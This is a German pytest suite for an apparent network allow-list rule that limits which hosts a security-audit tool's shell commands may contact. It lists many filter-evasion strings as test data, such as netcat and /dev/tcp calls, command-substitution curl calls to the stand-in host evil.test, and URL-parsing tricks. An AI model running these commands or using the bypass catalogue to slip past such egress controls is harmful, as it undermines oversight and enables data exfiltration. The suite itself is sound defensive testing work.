"""Tests für netzregel.py (eine Host-Regel für Schema und Eval).

Aufruf: python3 -m pytest security-audit/scripts/test_netzregel.py -q
"""
import os
import shlex
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import netzregel  # noqa: E402

POC = "python3 /x/scripts/poc.py"


def test_erlaubte_hosts():
    assert netzregel.ERLAUBTE_HOSTS == frozenset({"app", "db", "localhost", "127.0.0.1", "::1", "0.0.0.0"})


# ------------------------------------------------------------------------------ hosts_extrahieren

def test_kein_host_in_pfad():
    assert netzregel.hosts_extrahieren("src/server.js") == []


def test_url_mit_schema():
    assert netzregel.hosts_extrahieren("curl http://db.fixture.invalid/x") == ["db.fixture.invalid"]


def test_url_kodiert_einmal_dekodiert():
    assert "db.fixture.invalid" in netzregel.hosts_extrahieren("?url=http%3A%2F%2Fdb.fixture.invalid")


def test_ipv6_ohne_klammern_und_port():
    assert netzregel.hosts_extrahieren("http://[::1]:3000/") == ["::1"]


def test_host_klein_und_ohne_port():
    assert netzregel.hosts_extrahieren("HTTP://EVIL.Test:8080/x") == ["evil.test"]


def test_userinfo_wird_ignoriert_echter_host_zaehlt():
    assert netzregel.hosts_extrahieren("http://app@evil.test/") == ["evil.test"]
    assert netzregel.hosts_extrahieren("http://evil.test@app/") == ["app"]


def test_backslash_trick_beide_lesarten():
    assert "evil.test" in netzregel.hosts_extrahieren("http://app\\@evil.test/")


def test_header_host():
    assert netzregel.hosts_extrahieren("-H 'Host: evil.test'") == ["evil.test"]
    assert netzregel.hosts_extrahieren("GET / HTTP/1.1\nHost: evil.test:81\n") == ["evil.test"]


def test_localhost_im_namen_ist_kein_header():
    assert netzregel.hosts_extrahieren("localhost:3000") == []


def test_resolve_connect_to_proxy():
    assert "evil.test" in netzregel.hosts_extrahieren("--resolve evil.test:80:127.0.0.1")
    assert "6.6.6.6" in netzregel.hosts_extrahieren("--resolve app:3000:6.6.6.6")
    assert "evil.test" in netzregel.hosts_extrahieren("--connect-to evil.test:80:app:3000")
    assert "evil.test" in netzregel.hosts_extrahieren("--connect-to app:3000:evil.test:80")
    assert "evil.test" in netzregel.hosts_extrahieren("-x evil.test:3128")
    assert "evil.test" in netzregel.hosts_extrahieren("--proxy http://u:p@evil.test:8080")
    assert "evil.test" in netzregel.hosts_extrahieren("--proxy=evil.test:1")


def test_file_url_leerer_host_ist_lokal():
    assert netzregel.hosts_extrahieren("file:///etc/passwd") == []
    assert netzregel.verstoesse_poc("GET file:///etc/passwd") == []


def test_ungueltige_anfuehrung_stuerzt_nicht():
    assert netzregel.hosts_extrahieren("curl 'http://evil.test/") == ["evil.test"]


def test_einfacher_schraegstrich_ist_url_t2_n2_3():
    assert netzregel.hosts_extrahieren("http:/evil.test/") == ["evil.test"]
    assert netzregel.hosts_extrahieren("curl http:/evil.test/") == ["evil.test"]
    assert netzregel.hosts_extrahieren("file:/etc/passwd") == []          # file mit leerem Host ist lokal
    assert netzregel.verstoesse_poc("GET http:/app/x") == []


def test_quotes_zwischen_schema_und_schraegstrich_verbergen_host_nicht():
    assert "evil.test" in netzregel.verstoesse_poc("GET http:''//evil.test")
    assert "evil.test" in netzregel.verstoesse_poc('GET http:""//evil.test')
    assert "evil.test" in netzregel.verstoesse_poc("GET 'http:'//evil.test")


# ------------------------------------------------------------------------------ verstoesse_poc

def test_poc_ziel_in_query_ist_erlaubt():
    assert netzregel.verstoesse_poc("GET http://app:3000/preview?url=http://127.0.0.1/admin") == []


def test_poc_kodiertes_fremdes_ziel():
    assert len(netzregel.verstoesse_poc("GET http://app:3000/p?u=http%3A%2F%2Fevil.test")) == 1


# ------------------------------------------------------------------------------ ist_poc_aufruf

POC_OK = "python3 -I /abs/scripts/poc.py"


def test_poc_aufruf_einfacher_befehl():
    assert netzregel.ist_poc_aufruf("python3 /x/scripts/poc.py starten")
    assert netzregel.ist_poc_aufruf("python3 -I /x/scripts/poc.py")
    assert netzregel.ist_poc_aufruf(f"{POC_OK} anfrage --pfad '/a?x=1&y=2'")
    assert netzregel.ist_poc_aufruf(f"{POC_OK} starten --env DATABASE_URL=postgres://u@db/app")


def test_poc_aufruf_sonderzeichen_in_einfachen_anfuehrungszeichen_erlaubt():
    assert netzregel.ist_poc_aufruf(f"{POC_OK} a 'b;c&d|e<f>g$h`i(j)k{{l}}m#n\\o\"p!q*r'")


@pytest.mark.parametrize("zeichen", list(";&|<>$`(){}#\\\"!*"))
def test_poc_aufruf_unsicheres_zeichen_ausserhalb_quotes_ist_kein_poc(zeichen):
    assert not netzregel.ist_poc_aufruf(f"{POC_OK} a {zeichen} b")
    assert not netzregel.ist_poc_aufruf(f"{POC_OK} a{zeichen}")
    assert netzregel.ist_poc_aufruf(f"{POC_OK} a '{zeichen}' b")


@pytest.mark.parametrize("befehl", [
    "curl /x/scripts/poc.py", "python /x/scripts/poc.py a", "python3 /x/notpoc.py a", "python3 poc.py a",
    "python3 -c x /x/scripts/poc.py", " python3 /x/scripts/poc.py", "python3  /x/scripts/poc.py a",
    "python3 /x/scripts/poc.py.bak a", "python3 /x/scripts/poc.pyx a", "", "python3 ",
    "env python3 /x/scripts/poc.py a", "cd /x && python3 /x/scripts/poc.py a",
    f"{POC_OK} a 'offen", f"{POC_OK} a\nb", f"{POC_OK} a 'b\nc'", f"{POC_OK} a\rb", f"{POC_OK} a\x00",
    f"{POC_OK} a \"b\"", f"{POC_OK} a $'b'", f"{POC_OK} a 'b'\"c\"", f"{POC_OK} a $(x)", f"{POC_OK} a ${{x:-a #}}",
    f"{POC_OK} a ~ b ; c",
])
def test_poc_aufruf_nein(befehl):
    assert not netzregel.ist_poc_aufruf(befehl)


# ------------------------------------------------------------------------------ verstoesse_bash

def test_bash_url_ohne_poc_ist_verstoss_auch_localhost():
    assert len(netzregel.verstoesse_bash("curl http://localhost:3000/a", [])) == 1


def test_bash_poc_mit_db_url_ist_erlaubt():
    assert netzregel.verstoesse_bash(f"{POC} starten --env DATABASE_URL=postgres://u@db/app", []) == []


def test_bash_poc_mit_i_flag():
    assert netzregel.verstoesse_bash("python3 -I /x/scripts/poc.py anfrage --pfad /a http://app:3000/", []) == []


def test_bash_positivfaelle_aus_dem_plan():
    assert netzregel.verstoesse_bash(
        f"{POC_OK} anfrage --rolle p1 --methode GET --pfad '/api/preview?a=1&url=http://127.0.0.1:3000/admin'",
        []) == []
    assert netzregel.verstoesse_bash(
        f"{POC_OK} starten --rolle p1 --start-befehl 'node src/server.js' --port 3000 "
        "--env 'DATABASE_URL=postgres://u@db/app'", []) == []
    assert netzregel.verstoesse_bash(f"{POC} anfrage --pfad '/x?a=1&b=2'", []) == []
    assert netzregel.verstoesse_bash(f"{POC} anfrage --daten 'a=1&url=http://127.0.0.1/'", []) == []


def test_bash_verbotenes_muster_nur_bei_treffer():
    assert netzregel.verstoesse_bash("grep -r x .env.production", ["fixture.invalid"]) == []
    assert len(netzregel.verstoesse_bash("cat db.fixture.invalid", ["fixture.invalid"])) == 1
    assert len(netzregel.verstoesse_bash("cat db%2Efixture.invalid", ["db.fixture"])) == 1
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad '/x/fixture.invalid'", ["fixture.invalid"])) == 1


def test_bash_poc_mit_fremdem_host():
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad http://evil.test/", [])) == 1
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad 'http://evil.test/'", [])) == 1
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad 'http:'//evil.test/", [])) == 1


def test_bash_poc_mit_option_hosts_pruefen():
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage --resolve evil.test:80:127.0.0.1", [])) == 1
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage -H 'Host: evil.test'", [])) == 1


def test_bash_file_url_ohne_host_ist_lokal():
    assert netzregel.verstoesse_bash("cat file:///etc/passwd", []) == []
    assert netzregel.verstoesse_bash("cat file:/etc/passwd", []) == []


def test_bash_meldung_enthaelt_keine_rohen_steuerzeichen():
    meldungen = netzregel.verstoesse_bash("curl 'http://evil.test\x1b[31m/x'", [])
    assert meldungen and all("\x1b" not in m and "\n" not in m for m in meldungen)


# ------------------------------------------------------------------------------ Umgehungsbelege (Reviews T2)

@pytest.mark.parametrize("befehl", [
    # Re-Review 2: N2-1 #-Kommentar in ${…}, N2-2 NUL in $'…', N2-3 http:/host
    "echo ${x:-a #}; echo $((40+2))PWN http://evil.test/",
    "python3 -I /x/scripts/poc.py a $'http://evil.test\\x00@app/'",
    "python3 -I /x/scripts/poc.py a $'http://evil.test\x00@app/'",
    "curl http:/evil.test/",
    # Task-Review: gequotete Operatoren, verkettete Aufrufe
    "curl ';' python3 -I /x/scripts/poc.py http://localhost:3000/",
    "curl -d '&&' python3 /x/scripts/poc.py http://localhost:3000/",
    "echo ';' python3 /x/scripts/poc.py http://localhost:3000/",
    'echo "|" python3 /x/scripts/poc.py http://localhost:3000/',
    r"echo \; python3 /x/scripts/poc.py http://localhost:3000/",
    "echo '\n' python3 /x/scripts/poc.py http://localhost:3000/",
    "python3 -I /x/scripts/poc.py a && curl http://localhost/",
    f"{POC} pruefen && curl http://localhost:3000/",
    f"{POC} pruefen ; curl http://localhost:3000/",
    f"{POC} pruefen && {POC} pruefen --x http://app:1/",
    f"{POC} pruefen; echo $(curl -s http://evil.test)",
    # Substitutionen, Schema-Tricks (M3)
    "curl $(echo http)://evil.test", "curl ${H}://evil.test", "curl `echo h`://evil.test",
    "curl h${x}://localhost:3000/", 'echo "$(curl http://evil.test)"', "echo `curl http://evil.test`",
    f'{POC} anfrage --daten "$(curl http://localhost:3000/)"',
    'echo "\\$(curl http://evil.test)"',
    f'{POC} anfrage --daten "\\$(curl http://localhost:3000/)"',
    # poc.py nur als python3 + scripts/poc.py
    "curl /x/scripts/poc.py http://localhost/", "python3 /x/notpoc.py http://localhost/",
    "python3 poc.py http://localhost/", "python /x/scripts/poc.py http://localhost/",
    "python3 -c 'x' /x/scripts/poc.py http://localhost/", "curl http://localhost:3000/poc.py",
    # ANSI-C-Quoting, Kommentare, Umleitungen (R2: N1, N2)
    "python3 -I /x/scripts/poc.py a $'\\'' ; curl http://localhost:3000/ ; echo \\'",
    "curl $'http:\\x2f\\x2flocalhost:3000/'", "curl $'http:\\057\\057localhost:3000/'",
    "echo $'offen ; curl http://localhost:3000/",
    f"{POC} a # '\ncurl http://localhost:3000/\n# '",
    f"{POC} a#b ; curl http://localhost:3000/", r"echo a\ #b ; curl http://localhost:3000/",
    f"{POC} a '#' ; curl http://localhost:3000/", f"{POC} a \\#; curl http://localhost:3000/",
    f"{POC} a;# x\ncurl http://localhost:3000/", f"{POC} a # http://evil.test",
    f"{POC} a &< /dev/null curl http://localhost:3000/",
    f"{POC} a 2>&1 && curl http://localhost:3000/",
    f"{POC} a http://app:3000/ 2>&1", f"{POC} a http://app:3000/ &> /dev/null",
    # Quotes zwischen Schema und Schrägstrichen
    'curl "http:"//evil.test', "curl http:''//evil.test", 'curl http:""//evil.test', "curl 'http:'//evil.test",
])
def test_umgehungsbelege_sind_verstoesse(befehl):
    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1


def test_zusammengesetzt_mit_poc_ist_nicht_poc_jede_url_zaehlt():
    assert not netzregel.ist_poc_aufruf(f"{POC} pruefen && curl http://localhost:3000/")
    assert len(netzregel.verstoesse_bash(f"{POC} pruefen && curl http://localhost:3000/", [])) == 1
    assert len(netzregel.verstoesse_bash(f"{POC} a ; curl http://localhost:3000/", [])) == 1


def test_tief_verschachtelte_substitution_ohne_absturz_t2_m4():
    befehl = "echo " + "$(" * 1500 + "curl http://evil.test" + ")" * 1500
    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1
    assert netzregel.verstoesse_bash("echo " + "$(" * 1500 + "echo x" + ")" * 1500, []) == []


# ------------------------------------------------------------------------------ Host-Erkennung (Fix-Runde 1/2)

SONDERZEICHEN = ["&", ";", "'", "(", ")", "|", '"', "<", ">", "`", ",", "%"]


@pytest.mark.parametrize("zeichen", SONDERZEICHEN)
def test_userinfo_mit_sonderzeichen_umgeht_regel_nicht_t2_i1(zeichen):
    url = f"http://app{zeichen}@evil.test/"
    assert "evil.test" in netzregel.verstoesse_poc(f"GET {url}")
    assert "evil.test" in netzregel.verstoesse_poc(f"GET '{url}'")
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad {shlex.quote(url)}", [])) >= 1
    assert len(netzregel.verstoesse_bash(f'{POC} anfrage --pfad "{url}"', [])) >= 1


def test_nachlaufzeichen_machen_erlaubte_hosts_nicht_zu_verstoessen_t2_i1():
    for text in ("(curl http://app:3000)", "x 'http://db'", 'x "http://localhost:3000"', "http://app, http://db;",
                 "[http://[::1]:3000/]"):
        assert netzregel.verstoesse_poc(text) == [], text


def test_backslash_userinfo_meldet_den_fremden_host_t2_i4():
    assert "evil.test" in netzregel.hosts_extrahieren("http://evil.test\\@app/")
    assert "evil.test" in netzregel.verstoesse_poc("http://evil.test\\@app/")


def test_mehrfach_at_host_ist_der_teil_nach_dem_letzten_at_t2_i4():
    assert netzregel.hosts_extrahieren("http://x@app@evil.test") == ["evil.test"]
    assert netzregel.hosts_extrahieren("http://evil.test@app@app") == ["app"]


def test_url_kodierter_host_header_t2_i4():
    assert netzregel.hosts_extrahieren("Host%3A%20evil.test") == ["evil.test"]
    assert netzregel.verstoesse_poc("-H 'Host%3A%20evil.test'") == ["evil.test"]


def test_poc_host_ohne_klares_schema_t2_m3():
    assert "evil.test" in netzregel.verstoesse_poc("GET ${H}://evil.test/")


def test_enge_lesart_unquotiert_t2_n4():
    assert "evil.test" in netzregel.verstoesse_poc("GET http://evil.test;@app/")
    assert "evil.test" in netzregel.verstoesse_poc("GET http://evil.test&@app/")


@pytest.mark.parametrize("url", ["http:///evil.test/", "http:////evil.test", "https:///evil.test", r"https:/\evil.test",
                                 r"http:\\evil.test", "http:///evil.test:8080/x", "HTTP:///Evil.Test", "ws:///evil.test",
                                 "http:/evil.test"])
def test_leere_authority_liest_pfadanfang_als_host_t2_a1(url):
    assert netzregel.hosts_extrahieren(url) == ["evil.test"]
    assert netzregel.verstoesse_poc(f"GET {url}") == ["evil.test"]
    assert len(netzregel.verstoesse_bash(f"curl {shlex.quote(url)}", [])) == 1
    assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad {shlex.quote(url)}", [])) == 1


def test_leere_authority_mit_erlaubtem_host_und_file_t2_a1():
    assert netzregel.verstoesse_poc("GET http:///localhost:3000/") == []
    assert netzregel.verstoesse_poc("GET http:///app/x") == []
    assert netzregel.hosts_extrahieren("file:///etc/passwd") == []
    assert netzregel.hosts_extrahieren("FILE:////etc/passwd") == []
    assert netzregel.verstoesse_bash("cat file:///etc/passwd", []) == []
    assert netzregel.hosts_extrahieren("http:///") == []


def test_zeilenfortsetzung_nach_schema_umgeht_nicht_ohne_host():
    assert len(netzregel.verstoesse_bash("curl http://\\\nevil.test", [])) >= 1


# ------------------------------------------------------------------------------ Fix-Runde 1 zum Design-Pass

@pytest.mark.parametrize("befehl", [
    "python3 -I -W/x/scripts/poc.py -c 'import x'", "python3 -W/x/scripts/poc.py -c x",
    "python3 -I -X/x/scripts/poc.py -c x", "python3 -I -c/x/scripts/poc.py x", "python3 -I -E/x/scripts/poc.py -c x",
    "python3 -I --x/x/scripts/poc.py -c x", "python3 -I -/x/scripts/poc.py", "python3 -I -I /x/scripts/poc.py",
    "python3 x/scripts/poc.py a", "python3 ./scripts/poc.py a", "python3 scripts/poc.py a",
    "python3 ../scripts/poc.py a", "python3 -I  /x/scripts/poc.py a", "python3 -I /x/scripts/poc.py\ta",
])
def test_poc_pfad_beginnt_mit_slash_dc1(befehl):
    assert not netzregel.ist_poc_aufruf(befehl)


def test_poc_pfad_absolut_oder_home_dc1():
    assert netzregel.ist_poc_aufruf("python3 /scripts/poc.py a")
    assert netzregel.ist_poc_aufruf("python3 -I ~/skills/security-audit/scripts/poc.py a")
    assert netzregel.ist_poc_aufruf("python3 -I /a-b/-c/scripts/poc.py a")


def test_angehaengte_python_optionen_sind_verstoss_dc1():
    befehl = "python3 -I -W/x/scripts/poc.py -c 'import urllib.request as u;u.urlopen(\"http://evil.test\")'"
    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1
    assert len(netzregel.verstoesse_bash("python3 -I -c/x/scripts/poc.py http://app/", [])) >= 1


WHITESPACE = (["\t", "\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x1f", "\u0085", "\u00a0", "\u1680", "\u2028", "\u2029",
               "\u202f", "\u205f", "\u3000"] + [chr(c) for c in range(0x2000, 0x200B)])


def test_whitespace_liste_hat_19_unicode_zeichen_dc2():
    assert len([w for w in WHITESPACE if ord(w) > 0x7F]) == 19
    assert all(w.isspace() for w in WHITESPACE)


@pytest.mark.parametrize("ws", WHITESPACE, ids=lambda w: f"U+{ord(w):04X}")
def test_whitespace_in_authority_versteckt_host_nicht_dc2(ws):
    for url in (f"http://app{ws}@evil.test/", f"http:{ws}//evil.test/", f"http://{ws}evil.test/",
                f"http://evil.test{ws}@app/"):
        assert "evil.test" in netzregel.verstoesse_poc(f"GET {url}"), url
        assert "evil.test" in netzregel.hosts_extrahieren(f"GET {url}"), url
        assert len(netzregel.verstoesse_bash(f"{POC} anfrage --pfad '{url}'", [])) >= 1, url
        assert len(netzregel.verstoesse_bash(f"curl '{url}'", [])) >= 1, url


@pytest.mark.parametrize("ws", ["\x0b", "\x0c", "\u00a0"])
def test_whitespace_im_header_dc2(ws):
    assert "evil.test" in netzregel.verstoesse_poc(f"Host:{ws}evil.test")


def test_poc_aufruf_nur_druckbares_ascii_dc2():
    for ch in ("\t", "\x0b", "\x0c", "\x1f", "\x7f", "\u00a0", "\u2028", "\u3000", "ä", "\x80"):
        assert not netzregel.ist_poc_aufruf(f"{POC_OK} a '{ch}'"), repr(ch)
        assert not netzregel.ist_poc_aufruf(f"{POC_OK} a{ch}b"), repr(ch)
        assert len(netzregel.verstoesse_bash(f"{POC_OK} a '{ch}' http://app{ch}@evil.test/", [])) >= 1, repr(ch)


def test_laufzeit_bleibt_linear_di1():
    import time
    eingaben = ["a" * 50000, "a:" * 25000, "a-" * 25000, "http:" * 10000, "://" * 15000, " " * 50000,
                "; " * 25000, "a.b-" * 12000 + "host:", "x" * 50000 + "://"]
    for eingabe in eingaben:
        start = time.perf_counter()
        netzregel.verstoesse_bash(eingabe, [])
        netzregel.verstoesse_poc(eingabe)
        assert time.perf_counter() - start < 1.0, eingabe[:20]


@pytest.mark.parametrize("text", ["C:\\Users\\x", "POST:/api/x", "GET:/admin", "Lies datei:/etc/passwd",
                                  "Pfad: C:/Windows/x", "TODO:/x"])
def test_ein_slash_nur_fuer_netzschemata_di2(text):
    assert netzregel.hosts_extrahieren(text) == []
    assert netzregel.verstoesse_poc(text) == []


def test_ein_slash_netzschemata_und_grosskleinschreibung_di2():
    for schema in ("http", "https", "ws", "wss", "ftp", "ftps", "HTTP", "Https", "FtPs"):
        assert netzregel.hosts_extrahieren(f"{schema}:/evil.test/") == ["evil.test"], schema
        assert netzregel.hosts_extrahieren(f"{schema}:\\evil.test/") == ["evil.test"], schema
    assert netzregel.hosts_extrahieren("gopher://evil.test/") == ["evil.test"]          # zwei Slashes: jedes Schema
    assert netzregel.hosts_extrahieren("x:\\\\evil.test") == ["evil.test"]
    assert len(netzregel.verstoesse_bash("curl http:/evil.test/", [])) == 1
    assert netzregel.verstoesse_bash("grep -r 'TODO:/' .", []) == []


@pytest.mark.parametrize("befehl", [
    "curl evil.test", "wget -qO- evil.test", "nc evil.test 80", "echo x | nc evil.test 80", "cat < /dev/tcp/evil.test/80",
    "echo x > /dev/udp/evil.test/53", "ncat evil.test 80", "netcat evil.test 80", "telnet evil.test", "ssh u@evil.test",
    "scp f evil.test:/x", "socat - TCP:evil.test:80", "ftp evil.test", "http evil.test", "httpie evil.test",
    "ls; curl evil.test", "ls && wget evil.test", "ls || nc evil.test 1", "(curl evil.test)", "echo $(curl evil.test)",
    "echo `curl evil.test`", "ls\ncurl evil.test", "sudo curl evil.test", "env FOO=1 curl evil.test",
    "xargs curl", "sudo xargs -n1 curl evil.test", "/usr/bin/curl evil.test", "  curl evil.test", "ls &curl evil.test",
    "curl", "echo a | ssh host",
])
def test_netzwerkwerkzeug_in_befehlsposition_di3(befehl):
    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1


@pytest.mark.parametrize("befehl", [
    "grep -rn curl src/", "grep -n 'wget' README.md", "echo curl", "cat nc.txt", "ls ncat-docs", "git log --oneline",
    "npm run ssh-keys", "cat curlrc", "echo 'use curl here'", "sed s/http/x/ f", "grep -r wget .",
])
def test_netzwerkwerkzeug_als_argument_ist_kein_verstoss_di3(befehl):
    assert netzregel.verstoesse_bash(befehl, []) == []


def test_netzwerkwerkzeug_mit_url_wird_nur_einmal_gemeldet_di3():
    assert len(netzregel.verstoesse_bash("curl http://evil.test/", [])) == 1


@pytest.mark.parametrize("befehl", [
    "curl -H 'Host: evil.test' app", "curl --resolve evil.test:80:127.0.0.1 app", "curl --connect-to app:80:evil.test:80 app",
    "curl -x evil.test:3128 app", "curl --proxy=evil.test:1 app", "echo x --resolve app:3000:6.6.6.6",
    "cat x --connect-to evil.test:80:app:3000",
])
def test_optionen_hosts_auch_ohne_poc_di3(befehl):
    assert len(netzregel.verstoesse_bash(befehl, [])) >= 1


def test_optionen_mit_erlaubten_hosts_ohne_poc_ok_di3():
    assert netzregel.verstoesse_bash("echo x --resolve app:3000:127.0.0.1 --connect-to app:80:db:80", []) == []
